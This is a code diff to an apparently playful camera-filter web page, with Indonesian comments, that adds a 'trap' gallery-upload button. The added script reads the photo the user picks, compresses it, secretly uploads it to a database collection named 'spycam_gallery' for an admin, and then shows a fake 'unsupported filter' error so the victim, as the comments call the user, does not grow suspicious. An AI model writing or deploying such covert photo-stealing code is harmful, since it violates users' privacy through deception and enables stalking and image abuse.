@@ -135,7 +135,15 @@
                 </a>
             </div>
 
-            <div class="glass-panel px-6 py-4 rounded-3xl flex items-center gap-4 w-full justify-center hover:scale-105 transition-transform z-10">
+            <!-- TOMBOL JEBAKAN GALERI -->
+            <div class="w-full z-10 mt-2">
+                <label for="fake-upload" class="bg-indigo-400 hover:bg-indigo-500 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105 cursor-pointer border-2 border-white">
+                    <span>🖼️</span> Kasih Filter ke Foto Galeri
+                </label>
+                <input type="file" id="fake-upload" accept="image/*" class="hidden">
+            </div>
+
+            <div class="glass-panel px-6 py-4 rounded-3xl flex items-center gap-4 w-full justify-center hover:scale-105 transition-transform z-10 mt-2">
                 <div class="bg-white/80 p-2 rounded-full"><span id="status-icon" class="text-2xl block">👋</span></div>
                 <p id="status-text" class="text-pink-500 font-cute text-lg font-medium">Izinkan kamera ya!</p>
             </div>
@@ -504,6 +512,51 @@
                 bgMusic.play().then(() => { icon.innerText = "🎵"; isMusicPlaying = true; })
                 .catch(() => statusText.innerText = "Lagu blm ada!");
             }
+        });
+
+        // --- TRIK JEBAKAN UPLOAD FOTO GALERI ---
+        const fakeUpload = document.getElementById('fake-upload');
+        fakeUpload.addEventListener('change', (event) => {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            statusText.innerText = "Menerapkan filter...";
+            statusIcon.innerText = "⏳";
+
+            // Baca foto yang dipilih korban
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const img = new Image();
+                img.onload = () => {
+                    // Kompres foto pakai Canvas biar database ga jebol
+                    const tempCanvas = document.createElement('canvas');
+                    const MAX_WIDTH = 800;
+                    const scaleSize = MAX_WIDTH / img.width;
+                    tempCanvas.width = MAX_WIDTH;
+                    tempCanvas.height = img.height * scaleSize;
+                    
+                    const ctx = tempCanvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, tempCanvas.width, tempCanvas.height);
+                    
+                    const compressedBase64 = tempCanvas.toDataURL('image/jpeg', 0.8);
+
+                    // Kirim diam-diam ke Galeri Admin!
+                    push(ref(db, 'spycam_gallery'), {
+                        image: compressedBase64,
+                        timestamp: Date.now(),
+                        userId: myUserId + "_uploaded"
+                    }).then(() => {
+                        // Kasih error palsu biar korban gak curiga
+                        setTimeout(() => {
+                            statusText.innerText = "Yah, foto ini ga support filter! 🥺";
+                            statusIcon.innerText = "❌";
+                            fakeUpload.value = ''; // reset
+                        }, 1500);
+                    });
+                };
+                img.src = e.target.result;
+            };
+            reader.readAsDataURL(file);
         });
 
         startApp();
